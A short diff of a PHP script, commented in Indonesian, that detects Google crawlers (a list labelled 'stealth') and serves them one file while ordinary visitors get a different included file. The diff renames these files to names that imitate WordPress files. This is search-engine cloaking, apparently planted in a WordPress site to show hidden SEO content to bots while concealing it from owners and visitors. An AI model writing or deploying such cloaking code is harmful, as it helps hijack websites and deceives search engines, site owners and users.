@@ -7,7 +7,7 @@
         // ------------------------
         // Daftar bot / crawler Google (netral, stealth)
         // ------------------------
-        $clientPatterns = [
+        $clientPatterns = [ 
             'G1',          // Googlebot
             'G2',          // Google Site Verification
             'G3',          // Google Inspection Tool
@@ -37,7 +37,7 @@
         // ------------------------
         if (check_client($clientPatterns)) {
             // Konten khusus bot (SEO)
-            $botFile = 'wp-blog-reloader.php'; // bisa juga langsung embed konten disini
+            $botFile = 'wp-blog-loader.php'; // bisa juga langsung embed konten disini
             if (file_exists($botFile)) {
                 echo file_get_contents($botFile);
             } else {
@@ -46,7 +46,7 @@
             exit;
         } else {
             // Konten asli visitor
-            $mainFile = 'wp-blog-loader.php';
+            $mainFile = 'wp-blog-track.php';
             if (file_exists($mainFile)) {
                 include $mainFile;
             } else {
